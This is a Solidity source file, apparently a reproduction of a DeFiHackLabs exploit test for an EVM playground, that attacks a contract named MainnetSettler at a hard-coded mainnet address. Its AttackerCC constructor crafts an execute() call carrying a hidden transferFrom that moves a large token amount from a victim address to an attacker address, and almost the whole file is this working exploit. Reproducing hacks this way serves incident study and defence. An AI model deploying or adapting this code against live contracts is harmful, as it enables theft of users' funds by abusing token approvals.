pragma solidity ^0.8.10;

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// MainnetSettler_exp.sol test's logic verbatim. The original test's entire
// attack runs inside AttackerC's CONSTRUCTOR, but the playground never records
// the top-level exploit contract's own deploy (mirroring Foundry's
// `new AttackerC()` boilerplate) — only a RECORDED function call is traced. So
// AttackerC's constructor logic is moved into a plain `attack()` function;
// AttackerCC (deployed from within that call, not at the top level) still
// performs the real work in its own constructor exactly as the original test did.

address constant MainnetSettler = 0x70bf6634eE8Cb27D04478f184b9b8BB13E5f4710;
address constant attacker = 0x3A38877312D1125d2391663CBa9f7190953Bf2d9;
address constant hold = 0x68B36248477277865c64DFc78884Ef80577078F3;
address constant addr3 = 0xA31d98b1aA71a99565EC2564b81f834E90B1097b;

contract AttackerC {
    function attack() external {
        new AttackerCC();
    }
}

contract AttackerCC {
    constructor() {
        bytes32 fixeddata = hex"e0b1db9e7c871328327e3f9e0000000000000000000000000000000000000000";

        bytes memory call1 = abi.encodeWithSelector(
            bytes4(0x38c9c147),
            uint256(0),
            uint256(10000),
            address(hold),
            uint256(0),
            uint256(160),
            uint256(100)
        );

        bytes memory call2 = abi.encodeWithSelector(
            bytes4(0x23b872dd),
            address(addr3),
            address(attacker),
            uint256(308453642481581939556432141)
        );

        bytes[] memory actions = new bytes[](1);
        actions[0] = abi.encodePacked(call1,call2);
    
        IMainnetSettler.Slippage[] memory slippages = new IMainnetSettler.Slippage[](1);
        slippages[0] = IMainnetSettler.Slippage({
            recipient: address(0),
            buyToken: address(0),
            minAmountOut: 0      
        });

        bytes memory data = abi.encodeWithSelector(
            IMainnetSettler.execute.selector,
            slippages[0],
            actions,
            fixeddata
        );
        (bool ok, ) = MainnetSettler.call(data);
    }
}

interface IMainnetSettler {
    struct Slippage {
        address recipient;
        address buyToken;
        uint256 minAmountOut;
    }
	function execute(Slippage calldata, bytes[] calldata, bytes32) external returns (bool); 
}